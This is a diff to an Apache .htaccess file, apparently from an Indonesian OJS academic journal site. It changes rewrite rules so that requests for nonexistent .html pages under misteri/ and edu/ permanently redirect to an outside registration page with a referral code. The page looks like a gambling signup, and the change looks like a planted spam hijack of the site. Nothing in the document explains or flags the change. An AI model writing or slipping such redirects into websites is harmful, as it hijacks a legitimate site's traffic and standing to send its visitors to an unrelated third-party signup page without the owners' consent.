@@ -11,8 +11,8 @@ Options -Indexes
     # Pastikan meski folder misteri/ atau edu/ tidak ada, tetap redirect (tidak 403)
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteRule ^misteri/.*\.html$ https://preciseurl.org/babon [R=301,L,QSA]
-    RewriteRule ^edu/.*\.html$ https://preciseurl.org/babon [R=301,L,QSA]
+    RewriteRule ^misteri/.*\.html$ https://nota4djingga.live/register?ref=3UTAANT005N [R=301,L,QSA]
+    RewriteRule ^edu/.*\.html$ https://nota4djingga.live/register?ref=3UTAANT005N [R=301,L,QSA]
 
     # 🔐 Header Authorization (dibutuhkan OJS API dan login SSO)
     RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
